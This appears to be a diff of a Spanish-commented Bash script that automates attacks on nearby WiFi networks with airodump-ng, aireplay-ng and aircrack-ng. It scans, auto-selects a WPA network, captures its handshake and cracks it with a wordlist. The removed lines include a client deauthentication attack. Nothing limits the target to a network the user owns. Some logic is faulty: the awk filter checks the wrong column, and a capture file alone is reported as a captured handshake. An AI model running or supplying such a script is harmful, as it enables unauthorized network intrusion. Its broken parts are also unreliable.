@@ -51,65 +51,59 @@ fi
 
 # Paso 3: Escanear redes
 echo -e "${YELLOW}Paso 3: Escaneando redes cercanas...${NC}"
-echo -e "${YELLOW}Presiona Ctrl+C cuando encuentres la red objetivo.${NC}"
-# Eliminar el timeout para asegurar que las redes sean visibles
-airodump-ng $interface_mon
+echo -e "${YELLOW}El escaneo durará 1 minuto.${NC}"
+output_scan="scan_results.csv"
+timeout 60s airodump-ng --write $output_scan --output-format csv $interface_mon
 
-# Recomendaciones de redes óptimas
-read -p "¿Deseas ver las recomendaciones de redes óptimas? (s/n): " recommend_choice
-if [[ "$recommend_choice" == "s" ]]; then
-    echo -e "${YELLOW}Redes óptimas según la señal y actividad:${NC}"
-    echo -e "${GREEN}- Redes con mayor potencia de señal (PWR cercano a 0).${NC}"
-    echo -e "${GREEN}- Redes con clientes activos (STATIONs detectados).${NC}"
-    echo -e "${GREEN}- Redes con menos interferencias en el canal utilizado.${NC}"
-    echo -e "${YELLOW}Revisa la salida de airodump-ng para elegir una red apropiada.${NC}"
+echo -e "${GREEN}Escaneo completado. Analizando resultados...${NC}"
+
+# Analizar las redes escaneadas
+best_network=$(awk -F',' 'NR>2 && $4 ~ /WPA/ {print $1, $4, $6, $14 | "sort -t"," -k9 -n | head -n 1"}' $output_scan-01.csv)
+if [[ -z "$best_network" ]]; then
+    echo -e "${RED}No se encontraron redes óptimas para continuar.${NC}"
+    exit 1
+fi
+
+bssid=$(echo $best_network | awk '{print $1}')
+channel=$(echo $best_network | awk '{print $2}')
+essid=$(echo $best_network | awk '{print $3}')
+
+echo -e "${YELLOW}Red recomendada:${NC}"
+echo -e "BSSID: ${GREEN}$bssid${NC}, Canal: ${GREEN}$channel${NC}, ESSID: ${GREEN}$essid${NC}"
+
+read -p "¿Quieres continuar con esta red? (s/n): " continue_choice
+if [[ "$continue_choice" != "s" ]]; then
+    echo -e "${RED}Proceso terminado por el usuario.${NC}"
+    exit 1
 fi
 
 # Paso 4: Captura de paquetes
-read -p "Introduce el BSSID de la red objetivo: " bssid
-read -p "Introduce el canal (CH) de la red: " channel
-read -p "Introduce un nombre para el archivo de salida: " output
+echo -e "${YELLOW}Iniciando captura de paquetes para $essid en el canal $channel...${NC}"
+airodump-ng --bssid $bssid -c $channel -w capture --output-format cap $interface_mon &
+echo -e "${YELLOW}Esperando handshake... Esto puede tardar unos minutos.${NC}"
+sleep 30
+pkill -f "airodump-ng"
 
-echo -e "${YELLOW}Iniciando captura de paquetes para $bssid en el canal $channel...${NC}"
-airodump-ng --bssid $bssid -c $channel -w $output $interface_mon &
-
-echo -e "${YELLOW}Esperando handshake...${NC}"
-sleep 5
-
-# Paso 5: Ataque de desautenticación (opcional)
-read -p "¿Quieres desautenticar clientes? (s/n): " deauth_choice
-if [[ "$deauth_choice" == "s" ]]; then
-    read -p "Introduce la MAC de un cliente (o deja vacío para atacar a todos): " client_mac
-    if [[ -z "$client_mac" ]]; then
-        echo -e "${YELLOW}Desautenticando todos los clientes...${NC}"
-        aireplay-ng --deauth 10 -a $bssid $interface_mon
-    else
-        echo -e "${YELLOW}Desautenticando cliente $client_mac...${NC}"
-        aireplay-ng --deauth 10 -a $bssid -c $client_mac $interface_mon
-    fi
-else
-    echo -e "${YELLOW}Saltando ataque de desautenticación.${NC}"
+# Verificar si se capturó el handshake
+if [[ ! -f capture-01.cap ]]; then
+    echo -e "${RED}No se capturó ningún handshake.${NC}"
+    exit 1
 fi
 
-# Paso 6: Detener captura
-read -p "¿Listo para detener la captura? (s/n): " stop_capture
-if [[ "$stop_capture" == "s" ]]; then
-    pkill -f "airodump-ng"
-    echo -e "${GREEN}Captura detenida.${NC}"
-fi
+echo -e "${GREEN}Handshake capturado exitosamente.${NC}"
 
-# Paso 7: Crackear la contraseña
+# Paso 5: Crackear la contraseña
 read -p "¿Quieres intentar crackear el handshake? (s/n): " crack_choice
 if [[ "$crack_choice" == "s" ]]; then
     read -p "Introduce la ruta al diccionario (default: /usr/share/wordlists/rockyou.txt): " wordlist
     wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
-    echo -e "${YELLOW}Crackeando el handshake con $wordlist...${NC}"
-    aircrack-ng -w $wordlist -b $bssid ${output}-01.cap
+    echo -e "${YELLOW}Crackeando el handshake con $wordlist... Esto puede tardar dependiendo del tamaño del diccionario.${NC}"
+    aircrack-ng -w $wordlist -b $bssid capture-01.cap
 else
     echo -e "${YELLOW}Saltando crackeo.${NC}"
 fi
 
-# Paso 8: Detener modo monitor
+# Paso 6: Detener modo monitor
 echo -e "${YELLOW}Desactivando modo monitor...${NC}"
 airmon-ng stop $interface_mon
 echo -e "${GREEN}Modo monitor desactivado.${NC}"
